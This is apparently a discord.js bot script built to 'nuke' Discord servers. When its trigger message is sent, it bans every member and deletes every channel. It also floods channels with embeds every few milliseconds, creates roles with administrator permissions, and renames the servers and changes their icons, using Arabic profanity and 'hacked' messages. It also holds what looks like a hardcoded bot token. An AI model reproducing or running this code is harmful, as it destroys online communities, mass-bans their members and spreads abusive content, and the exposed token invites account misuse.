const Discord = require("discord.js");
const client = new Discord.Client();
//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
const Token = "" //NTE1NTMxODY1NTMzMTg2MDUx.Dtmehg.SFEYWjjM7OkGjHfbH39aeNbGQ4s
const x_x = "" //play$
const teext = "" //كسمك
const vooice = "" //تم التهكير
const pic = "" //https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSD-Ixd2mwK1xPz2bzMGIs0b7aPo3kO9jQGM-hPgFf9XKwQLXIi
const spam = "" //تم النيك
const namee = "" //تيتو
const playing = "" //تهكير سيرفر
client.on('message', message => {
if (message.content === x_x) {
	var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
    hack.createChannel(teeext, 'text')
    hack.createChannel(vooice, 'voice')
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
	message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.user.setAvatar(pic)
   client.user.setUsername(namee)
   client.user.setGame(playing, 'https://www.twitch.tv/hix')
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
   hack.setName(namee)})})})}});
client.login(NTE1NTMxODY1NTMzMTg2MDUx.Dtmehg.SFEYWjjM7OkGjHfbH39aeNbGQ4s)